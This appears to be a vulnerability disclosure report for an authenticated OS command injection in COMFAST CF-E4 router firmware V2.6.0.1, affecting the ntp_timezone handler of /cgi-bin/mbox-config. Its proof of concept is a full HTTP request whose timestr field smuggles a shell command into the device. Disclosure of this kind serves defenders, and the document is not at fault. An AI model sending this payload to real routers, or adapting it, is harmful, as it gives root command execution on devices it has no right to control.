<img width="1285" height="668" alt="image" src="https://github.com/user-attachments/assets/97bb98b5-b2ef-40a0-b17e-4273e5e9ee38" /># COMFAST
# Vulnerability Analysis Report: COMFAST CF-E4 Remote Command Execution Vulnerability (V2.6.0.1)
1. Basic Vulnerability Information
Device Model: COMFAST CF-E4 (EC200A)

Firmware Version: V2.6.0.1

Vulnerable Component: /usr/bin/webmgnt

Vulnerable Interface: /cgi-bin/mbox-config

Vulnerability Type: OS Command Injection (CWE-78)

Privilege Required: Requires Authentication (Authorized Cookie)

# 2. Vulnerability Description
In the COMFAST CF-E4 V2.6.0.1 version Web management interface, when the /cgi-bin/mbox-config endpoint handles a SET request for the ntp_timezone interface, it fails to adequately validate the user-provided timestr field. 

This firmware version moves part of the business logic from the binary program to backend Shell script execution. After the backend program receives JSON data, it directly concatenates the timestr field into a system command (presumably date -s or a related NTP configuration script) for execution. An attacker can construct malicious shell characters in the timestr field (such as ;, &, |) to bypass the original logic and execute arbitrary commands on the device with root privileges.

# 3. Reproduction Steps (PoC)
Request Method: POST
Target URL: http://<TARGET_IP>/cgi-bin/mbox-config?method=SET&section=ntp_timezone
<img width="1285" height="668" alt="image" src="https://github.com/user-attachments/assets/48cc7cb5-0cb8-4232-9596-05690464cd20" />
<img width="1291" height="713" alt="image" src="https://github.com/user-attachments/assets/3f1d44ae-6944-47f1-b735-08f05d61c72c" />

<img width="1138" height="136" alt="image" src="https://github.com/user-attachments/assets/19ff9ef6-94ab-4c5f-b03c-e2bc1e432385" />
<img width="1136" height="483" alt="image" src="https://github.com/user-attachments/assets/aa850de9-4fbf-423b-aff9-4e499167a0a7" />
Command Sucessful

POC:
```
POST /cgi-bin/mbox-config?method=SET&section=ntp_timezone HTTP/1.1

Host: 127.0.0.1

sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"

sec-ch-ua-mobile: ?0

sec-ch-ua-platform: "Linux"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: COMFAST_SESSIONID=7f000001-000000000000-327b23c6

Connection: close

Content-Length: 218



{

    "timestr": "2021-10-10 10:10:10\"; touch /tmp/1; #",

    "timezone": "0",

    "zonename": "0",

    "hostname": "0",

    "ntp_client_enabled": "0",

    "ntp_enable_server": "0",

    "ntp_servername": "0"

}
```




